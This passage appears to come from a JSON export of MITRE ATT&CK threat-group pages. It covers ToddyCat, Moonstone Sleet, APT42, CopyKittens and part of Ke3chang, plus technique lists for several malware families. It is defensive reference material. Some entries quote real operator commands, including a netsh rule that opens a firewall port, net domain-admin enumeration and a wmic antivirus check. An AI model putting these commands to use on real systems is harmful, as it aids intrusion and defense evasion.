Browsers, Credentials from Password Stores, Deobfuscate/Decode Files or Information, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exploitation for Client Execution, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Regsvcs/Regasm, System Information Discovery, System Network Configuration Discovery, System Network Configuration Discovery: Wi-Fi Discovery, System Owner/User Discovery, System Time Discovery, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Credentials in Registry, User Execution: Malicious File, Video Capture, Virtualization/Sandbox Evasion, Windows Management Instrumentation S0334 DarkComet [1] Application Layer Protocol: Web Protocols, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter, Command and Scripting Interpreter: Windows Command Shell, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Software Packing, Process Discovery, Remote Services: Remote Desktop Protocol, System Information Discovery, System Owner/User Discovery, Video Capture S0447 Lokibot [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Injection: Process Hollowing, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Scheduled Task/Job, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion: Time Based Evasion S0336 NanoCore [1] Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Encrypted Channel: Symmetric Cryptography, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, System Network Configuration Discovery, Video Capture S0198 NETWIRE [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Login Items, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Launch Agent, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Invalid Code Signature, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy, Scheduled Task/Job: Cron, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, User Execution: Malicious File, User Execution: Malicious Link, Web Service References Unit42. (2016). SILVERTERRIER: THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE. Retrieved November 13, 2018. Renals, P., Conant, S. (2016). SILVERTERRIER: The Next Evolution in Nigerian Cybercrime. Retrieved November 13, 2018. "
},
{
"id": 151,
"title": "ToddyCat, Group G1022",
"path": "/groups/G1022/index.html",
"content": " ToddyCat ToddyCat is a sophisticated threat group that has been active since at least 2020 using custom loaders and malware in multi-stage infection chains against government and military targets across Europe and Asia.[1][2] ID: G1022 Version: 1.0 Created: 03 January 2024 Last Modified: 14 February 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account ToddyCat has run net user %USER% /dom for account discovery.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility ToddyCat has leveraged xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell ToddyCat has used Powershell scripts to perform post exploit collection.[2] .003 Command and Scripting Interpreter: Windows Command Shell ToddyCat has used .bat scripts and cmd for execution on compromised hosts.[2] Enterprise T1005 Data from Local System ToddyCat has run scripts to collect documents from targeted hosts.[2] Enterprise T1074 .002 Data Staged: Remote Data Staging ToddyCat manually transferred collected files to an exfiltration host using xcopy.[2] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage ToddyCat has used a DropBox uploader to exfiltrate stolen files.[2] Enterprise T1190 Exploit Public-Facing Application ToddyCat has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.[1] Enterprise T1083 File and Directory Discovery ToddyCat has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension.[2] Enterprise T1564 .003 Hide Artifacts: Hidden Window ToddyCat has hidden malicious scripts using powershell.exe -windowstyle hidden. [2] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Prior to executing a backdoor ToddyCat has run cmd /c start /b netsh advfirewall firewall add rule name=\"SGAccessInboundRule\" dir=in protocol=udp action=allow localport=49683 to allow the targeted system to receive UDP packets on port 49683.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location ToddyCat has used the name debug.exe for malware components.[1] Enterprise T1106 Native API ToddyCat has used WinExec to execute commands received from C2 on compromised hosts.[2] Enterprise T1095 Non-Application Layer Protocol ToddyCat has used a passive backdoor that receives commands with UDP packets.[2] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups ToddyCat has executed net group \"domain admins\" /dom for discovery on compromised machines.[2] Enterprise T1566 .003 Phishing: Spearphishing via Service ToddyCat has sent loaders configured to run Ninja as zip archives via Telegram.[1] Enterprise T1057 Process Discovery ToddyCat has run cmd /c start /b tasklist to enumerate processes.[2] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares ToddyCat has used locally mounted network shares for lateral movement through targated environments.[2] Enterprise T1018 Remote System Discovery ToddyCat has used ping %REMOTE_HOST% for post exploit discovery.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection.[2] Enterprise T1518 .001 Software Discovery: Security Software Discovery ToddyCat can determine is Kaspersky software is running on an endpoint by running cmd /c wmic process where name=\"avp.exe\".[2] Enterprise T1082 System Information Discovery ToddyCat has collected information on bootable drives including model, vendor, and serial numbers.[2] Enterprise T1049 System Network Connections Discovery ToddyCat has used netstat -anop tcp to discover TCP connections to compromised hosts.[2] Enterprise T1078 .002 Valid Accounts: Domain Accounts ToddyCat has used compromised domain admin credentials to mount local network shares.[2] Enterprise T1047 Windows Management Instrumentation ToddyCat has used WMI to execute scripts for post exploit document collection.[2] Software ID Name References Techniques S0020 China Chopper [1] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0154 Cobalt Strike [2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S1101 LoFiSe [2] Archive Collected Data, Automated Collection, Data from Local System, Data Staged: Local Data Staging, File and Directory Discovery, Hijack Execution Flow: DLL S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [2] System Network Connections Discovery S1100 Ninja [1] Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Data Encoding: Non-Standard Encoding, Data Obfuscation, Data Obfuscation: Protocol or Service Impersonation, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Environmental Keying, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Inter-Process Communication, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compression, Phishing: Spearphishing via Service, Process Discovery, Process Injection, Proxy: Multi-hop Proxy, Proxy: Internal Proxy, Scheduled Transfer, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, User Execution: Malicious File S1102 Pcexter [2] Data from Local System, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Hijack Execution Flow: DLL S0097 Ping [2] Remote System Discovery S1099 Samurai [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Compile After Delivery, Obfuscated Files or Information: Dynamic API Resolution, Obfuscated Files or Information, Proxy, Query Registry, Software Discovery References Dedola, G. (2022, June 21). APT ToddyCat. Retrieved January 3, 2024. Dedola, G. et al. (2023, October 12). ToddyCat: Keep calm and check logs. Retrieved January 3, 2024. "
},
{
"id": 152,
"title": "Moonstone Sleet, Storm-1789, Group G1036",
"path": "/groups/G1036/index.html",
"content": " Moonstone Sleet Moonstone Sleet is a North Korean-linked threat actor executing both financially motivated attacks and espionage operations. The group previously overlapped significantly with another North Korean-linked entity, Lazarus Group, but has differentiated its tradecraft since 2023. Moonstone Sleet is notable for creating fake companies and personas to interact with victim entities, as well as developing unique malware such as a variant delivered via a fully functioning game.[1] ID: G1036 \u24d8 Associated Groups: Storm-1789 Contributors: Aung Kyaw Min Naing, @Nolan Version: 1.0 Created: 26 August 2024 Last Modified: 01 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description Storm-1789 [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Moonstone Sleet registered domains to develop effective personas for fake companies used in phishing activity.[1] .003 Acquire Infrastructure: Virtual Private Server Moonstone Sleet registered virtual private servers to host payloads for download.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Moonstone Sleet used curl to connect to adversary-controlled infrastructure and retrieve additional payloads.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Moonstone Sleet used registry run keys for process execution during initial victim infection.[1] Enterprise T1217 Browser Information Discovery Moonstone Sleet deployed malware such as YouieLoader capable of capturing victim system browser information.[1] Enterprise T1486 Data Encrypted for Impact Moonstone Sleet has deployed ransomware in victim environments.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Moonstone Sleet delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis.[1] Enterprise T1587 Develop Capabilities Moonstone Sleet developed malicious npm packages for delivery to or retrieval by victims.[1] .001 Malware Moonstone Sleet has developed custom malware, including a malware delivery mechanism masquerading as a legitimate game.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Moonstone Sleet has created social media accounts to interact with victims.[1] .002 Establish Accounts: Email Accounts Moonstone Sleet has created email accounts to interact with victims, including for phishing purposes.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Moonstone Sleet gathered victim email address information for follow-on phishing activity.[1] Enterprise T1591 Gather Victim Org Information Moonstone Sleet has gathered information on victim organizations through email and social media interaction.[1] Enterprise T1105 Ingress Tool Transfer Moonstone Sleet retrieved a final stage payload from command and control infrastructure during initial installation on victim systems.[1] Enterprise T1027 Obfuscated Files or Information Moonstone Sleet delivers encrypted payloads in pieces that are then combined together to form a new portable executable (PE) file during installation.[1] .009 Embedded Payloads Moonstone Sleet embedded payloads in trojanized software for follow-on execution.[1] .013 Encrypted/Encoded File Moonstone Sleet has used encrypted payloads within files for follow-on execution and defense evasion.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Moonstone Sleet retrieved credentials from LSASS memory.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Moonstone Sleet delivered various payloads to victims as spearphishing attachments.[1] .003 Phishing: Spearphishing via Service Moonstone Sleet has used social media services to spear phish victims to deliver trojainized software.[1] Enterprise T1598 Phishing for Information Moonstone Sleet has interacted with victims to gather information via email.[1] .003 Spearphishing Link Moonstone Sleet used spearphishing messages containing items such as tracking pixels to determine if users interacted with malicious messages.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Moonstone Sleet used scheduled tasks for program execution during initial access to victim machines.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware Moonstone Sleet staged malicious capabilities online for follow-on download by victims or malware.[1] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain Moonstone Sleet has distributed a trojanized version of PuTTY software for initial access to victims.[1] Enterprise T1082 System Information Discovery Moonstone Sleet has gathered information on victim systems.[1] Enterprise T1016 System Network Configuration Discovery Moonstone Sleet has gathered information on victim network configuration.[1] Enterprise T1033 System Owner/User Discovery Moonstone Sleet deployed various malware such as YouieLoader that can perform system user discovery actions.[1] Enterprise T1569 .002 System Services: Service Execution Moonstone Sleet used intermediate loader malware such as YouieLoader and SplitLoader that create malicious services.[1] Enterprise T1204 .002 User Execution: Malicious File Moonstone Sleet relied on users interacting with malicious files, such as a trojanized PuTTY installer, for initial execution.[1] References Microsoft Threat Intelligence. (2024, May 28). Moonstone Sleet emerges as new North Korean threat actor with new bag of tricks. Retrieved August 26, 2024. "
},
{
"id": 153,
"title": "APT42, Group G1044",
"path": "/groups/G1044/index.html",
"content": " APT42 APT42 is an Iranian-sponsored threat group that conducts cyber espionage and surveillance.[1] The group primarily focuses on targets in the Middle East region, but has targeted a variety of industries and countries since at least 2015.[1] APT42 starts cyber operations through spearphishing emails and/or the PINEFLOWER Android malware, then monitors and collects information from the compromised systems and devices.[1] Finally, APT42 exfiltrates data using native features and open-source tools.[2] APT42 activities have been linked to Magic Hound by other commercial vendors. While there are behavior and software overlaps between Magic Hound and APT42, they appear to be distinct entities and are tracked as separate entities by their originating vendor. ID: G1044 Contributors: Sittikorn Sangrattanapitak Version: 1.0 Created: 08 January 2025 Last Modified: 08 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account APT42 has used the PowerShell-based POWERPOST script to collect local account names from the victim machine.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains APT42 has registered domains, several of which masqueraded as news outlets and login services, for use in operations.[1][3] .003 Acquire Infrastructure: Virtual Private Server APT42 has used anonymized infrastructure and Virtual Private Servers (VPSs) to interact with the victim\u2019s environment.[1][2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT42 has used tools such as NICECURL with command and control communication taking place over HTTPS.[2] Enterprise T1547 Boot or Logon Autostart Execution APT42 has modified the Registry to maintain persistence.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT42 has downloaded and executed PowerShell payloads.[1] .005 Command and Scripting Interpreter: Visual Basic APT42 has used a VBScript to query anti-virus products.[2] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers APT42 has used custom malware to steal credentials.[1] Enterprise T1132 .001 Data Encoding: Standard Encoding APT42 has encoded C2 traffic with Base64.[2] Enterprise T1530 Data from Cloud Storage APT42 has collected data from Microsoft 365 environments.[2][1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography APT42 has used tools such as NICECURL with command and control communication taking place over HTTPS.[2] Enterprise T1585 .002 Establish Accounts: Email Accounts APT42 has created email accounts to use in spearphishing operations.[3] Enterprise T1656 Impersonation APT42 has impersonated legitimate people in phishing emails to gain credentials.[1][3] Enterprise T1070 Indicator Removal APT42 has cleared Chrome browser history.[2] .008 Clear Mailbox Data APT42 has deleted login notification emails and has cleared the Sent folder to cover their tracks.[1] Enterprise T1056 Input Capture APT42 has used credential harvesting websites.[2] .001 Keylogging APT42 has used custom malware to log keystrokes.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location APT42 has masqueraded the VINETHORN payload as a VPN application.[1] Enterprise T1112 Modify Registry APT42 has modified Registry keys to maintain persistence.[1] Enterprise T1111 Multi-Factor Authentication Interception APT42 has intercepted SMS-based one-time passwords and has set up two-factor authentication.[1] Additionally, APT42 has used cloned or fake websites to capture MFA tokens.[2] Enterprise T1588 .002 Obtain Capabilities: Tool APT42 has used built-in features in the Microsoft 365 environment and publicly available tools to avoid detection.[2] Enterprise T1566 .002 Phishing: Spearphishing Link APT42 has sent spearphishing emails containing malicious links.[1][2][3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT42 has used scheduled tasks for persistence.[1] Enterprise T1113 Screen Capture APT42 has used malware, such as GHAMBAR and POWERPOST, to take screenshots.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery APT42 has used Windows Management Instrumentation (WMI) to check for anti-virus products.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware APT42 has used its infrastructure for C2 and for staging the VINETHORN payload, which masqueraded as a VPN application.[1] Enterprise T1539 Steal Web Session Cookie APT42 has used custom malware to steal login and cookie data from common browsers.[1] Enterprise T1082 System Information Discovery APT42 has used malware, such as GHAMBAR and POWERPOST, to collect system information.[1] Enterprise T1016 System Network Configuration Discovery APT42 has used malware, such as GHAMBAR and POWERPOST, to collect network information.[1] Enterprise T1102 Web Service APT42 has used various links, such as links with typo-squatted domains, links to Dropbox files and links to fake Google sites, in spearphishing operations.[2][1][3] Enterprise T1047 Windows Management Instrumentation APT42 has used Windows Management Instrumentation (WMI) to query anti-virus products.[2] Software ID Name References Techniques S1192 NICECURL [2] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter, Encrypted Channel: Asymmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer S1193 TAMECAT [2] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Software Discovery: Security Software Discovery, Windows Management Instrumentation References Mandiant. (n.d.). APT42: Crooked Charms, Cons and Compromises. Retrieved October 9, 2024. Rozmann, O., et al. (2024, May 1). Uncharmed: Untangling Iran's APT42 Operations. Retrieved October 9, 2024. Google Threat Analysis Group. (2024, August 14). Iranian backed group steps up phishing campaigns against Israel, U.S.. Retrieved October 9, 2024. "
},
{
"id": 154,
"title": "CopyKittens, Group G0052",
"path": "/groups/G0052/index.html",
"content": " CopyKittens CopyKittens is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip.[1][2][3] ID: G0052 Version: 1.6 Created: 16 January 2018 Last Modified: 17 November 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1560 .001 Archive Collected Data: Archive via Utility CopyKittens uses ZPP, a .NET console program, to compress files with ZIP.[2] .003 Archive Collected Data: Archive via Custom Method CopyKittens encrypts data with a substitute cipher prior to exfiltration.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell CopyKittens has used PowerShell Empire.[2] Enterprise T1564 .003 Hide Artifacts: Hidden Window CopyKittens has used -w hidden and -windowstyle hidden to conceal PowerShell windows. [2] Enterprise T1588 .002 Obtain Capabilities: Tool CopyKittens has used Metasploit, Empire, and AirVPN for post-exploitation activities.[4][5] Enterprise T1090 Proxy CopyKittens has used the AirVPN service for operational activity.[5] Enterprise T1553 .002 Subvert Trust Controls: Code Signing CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.[2] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[2] Software ID Name References Techniques S0154 Cobalt Strike [2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0363 Empire [2] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0167 Matryoshka [2] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Credentials from Password Stores, Input Capture: Keylogging, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Rundll32 S0164 TDTESS [2] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer References ClearSky Cyber Security. (2017, March 30). Jerusalem Post and other Israeli websites compromised by Iranian threat agent CopyKitten. Retrieved August 21, 2017. ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. Minerva Labs LTD and ClearSky Cyber Security. (2015, November 23). CopyKittens Attack Group. Retrieved November 17, 2024. ClearSky and Trend Micro. (2017, July). Operation Wilted Tulip - Exposing a cyber espionage apparatus. Retrieved May 17, 2021. Microsoft. (2022, June 2). Exposing POLONIUM activity and infrastructure targeting Israeli organizations. Retrieved July 1, 2022. "
},
{
"id": 155,
"title": "Ke3chang, APT15, Mirage, Vixen Panda, GREF, Playful Dragon, RoyalAPT, NICKEL, Nylon Typhoon, Group G0004",
"path": "/groups/G0004/index.html",
"content": " Ke3chang Ke3chang is a threat group attributed to actors operating out of China. Ke3chang has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe, and North America since at least 2010.[1][2][3][4] ID: G0004 \u24d8 Associated Groups: APT15, Mirage, Vixen Panda, GREF, Playful Dragon, RoyalAPT, NICKEL, Nylon Typhoon Contributors: Pooja Natarajan, NEC Corporation India; Manikantan Srinivasan, NEC Corporation India; Hiroki Nagahama, NEC Corporation Version: 3.1 Created: 31 May 2017 Last Modified: 04 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description APT15 [2] Mirage [2] Vixen Panda [2][3] GREF [2] Playful Dragon [2][3] RoyalAPT [3] NICKEL [4] Nylon Typhoon [5] Campaigns ID Name First Seen Last Seen References Techniques C0052 SPACEHOP Activity January 2019 [6] May 2024 [6] [6] Acquire Infrastructure: Virtual Private Server, Exploit Public-Facing Application, Obtain Capabilities: Tool, Proxy: Multi-hop Proxy Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Ke3chang performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions 